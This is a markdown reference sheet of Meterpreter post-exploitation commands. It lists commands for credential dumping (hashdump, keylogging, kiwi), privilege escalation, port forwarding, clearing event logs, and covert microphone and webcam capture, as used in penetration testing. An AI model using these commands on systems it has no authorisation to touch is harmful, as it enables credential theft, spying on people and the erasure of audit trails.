# Meterpreter Shell Command Reference

A categorized list of commonly used Meterpreter shell commands for post-exploitation.

---

## 🔧 Core Session Commands

| Command | Description |
|--------|-------------|
| `help` | Show all available Meterpreter commands. |
| `exit` | Exit the Meterpreter session. |
| `background` | Move the session to the background. |
| `sessions` | List all active sessions. |
| `sessions -i <id>` | Interact with a specific session. |

---

## 💻 System Information & Control

| Command | Description |
|---------|-------------|
| `sysinfo` | Get the target system’s OS and architecture. |
| `getuid` | Display the user you're running as. |
| `getpid` | Get the Meterpreter process ID. |
| `ps` | List all running processes. |
| `kill <pid>` | Kill a process by PID. |
| `migrate <pid>` | Migrate Meterpreter to another process. |

---

## 📂 File System Commands

| Command | Description |
|---------|-------------|
| `ls` | List files in the current directory. |
| `cd <path>` | Change directory. |
| `pwd` | Print the current working directory. |
| `download <file>` | Download a file from the target. |
| `upload <file>` | Upload a file to the target. |
| `mkdir <dir>` | Create a directory. |
| `rm <file>` | Delete a file. |
| `edit <file>` | Open and edit a file with a built-in editor. |

---

## 🔍 File Search Command

| Command | Description |
|---------|-------------|
| `search -f <pattern>` | Search for files matching a pattern. |
| `search -r` | Recursively search directories. |
| `search -d <dir>` | Specify the start directory. |
| `search -h` | Show help for `search`. |

### Examples:
- `search -f *.docx` — Find all `.docx` files.
- `search -f password.txt -r` — Recursive search for `password.txt`.
- `search -d C:\Users -f *.log -r` — Search `.log` files from a directory.

---

## 🖱️ Process & Privilege Commands

| Command | Description |
|---------|-------------|
| `getprivs` | List available privileges. |
| `steal_token` | Impersonate a security token. |
| `rev2self` | Revert to the original user. |
| `run post/windows/escalate/...` | Run privilege escalation scripts. |

---

## 🧑‍💼 User & Credential Dumping

| Command | Description |
|---------|-------------|
| `hashdump` | Dump local user hashes (SAM database). |
| `keyscan_start` | Start keystroke logging. |
| `keyscan_dump` | Dump captured keystrokes. |
| `keyscan_stop` | Stop the keylogger. |
| `run post/windows/gather/credentials/...` | Various credential gathering modules. |

---

## 📡 Networking Commands

| Command | Description |
|---------|-------------|
| `ipconfig` | View network configuration. |
| `route` | Display or modify the routing table. |
| `portfwd add -l <lport> -p <rport> -r <rhost>` | Set up port forwarding. |
| `netstat` | Show active connections. |
| `arp` | Show ARP table. |

---

## 🧠 System Interaction

| Command | Description |
|---------|-------------|
| `shell` | Open a standard command shell on the target. |
| `execute -f <path>` | Run a command or executable. |
| `clearev` | Clear event logs. |

---

## 🎥 Surveillance & Spying

| Command | Description |
|---------|-------------|
| `screenshot` | Capture a screenshot. |
| `record_mic` | Record audio from the mic. |
| `webcam_snap` | Take a webcam snapshot. |
| `webcam_stream` | Stream webcam feed. |
| `enum_desktop_users` | Enumerate desktop sessions. |

---

## 🧩 Extension Commands

To load additional capabilities:
```bash
load <extension_name>
```

### Common Extensions:
| Extension | Purpose |
|----------|---------|
| `stdapi` | File system, networking, etc. (default) |
| `priv` | Privilege escalation tools |
| `espia` | Spying (mic, webcam, screenshot) |
| `incognito` | Token manipulation |
| `kiwi` | Mimikatz-based credential dumping |

